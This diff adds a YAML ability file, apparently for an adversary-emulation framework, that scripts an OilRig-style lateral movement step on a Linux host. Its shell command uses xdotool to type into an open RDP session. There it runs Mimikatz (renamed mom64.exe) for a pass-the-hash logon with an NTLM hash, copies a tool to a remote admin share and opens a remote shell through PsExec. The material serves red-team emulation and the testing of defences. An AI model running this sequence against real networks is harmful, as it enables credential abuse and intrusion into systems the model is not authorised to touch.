@@ -1,0 +1,44 @@
+ability_id: 44073aa3-70e9-4a48-86b7-c25b6f29c25c
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: "Requires xdotool to be installed on the running machine. \nUses xdotool\
+  \ to control the RDP window to 10.1.0.6 that was opened in Step 7.A.4. \nExecutes\
+  \ Mimikatz PTH, copies RDAT to 10.1.0.7, and PsExecs to the SQL server\n"
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "sleep 5;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool\
+    \ search --pid \"$rdp_pid\");\nxdotool key --window \"$rdp_window\" Super_L;\n\
+    sleep 5; \nxdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"cmd\"\
+    ;\nsleep 3; \nxdotool key --window \"$rdp_window\" Ctrl+Shift+Return;\nsleep 3;\
+    \ \nxdotool key --window \"$rdp_window\" Tab Tab;\nxdotool key --window \"$rdp_window\"\
+    \ Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'C:\\Windows\\System32\\\
+    mom64.exe \"privilege::debug\" \"sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name}\
+    \ /ntlm:#{second.target.ntlm}\"';\nxdotool key --window \"$rdp_window\" Return;\n\
+    sleep 3; \nxdotool type --window \"$rdp_window\" 'copy C:\\Windows\\Temp\\Nt.dat\
+    \ \\\\#{third.target.ip}\\C$\\ProgramData\\';\nxdotool key --window \"$rdp_window\"\
+    \ Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'C:\\Windows\\System32\\\
+    ps.exe \\\\#{third.target.ip} cmd.exe';\nxdotool key --window \"$rdp_window\"\
+    \ Return;\nsleep 5;"
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 150
+  uploads: []
+  variations: []
+name: OilRig PSEXEC is used to execute commands on ENDOFROAD
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1569.002
+technique_name: 'System Services: Service Execution'
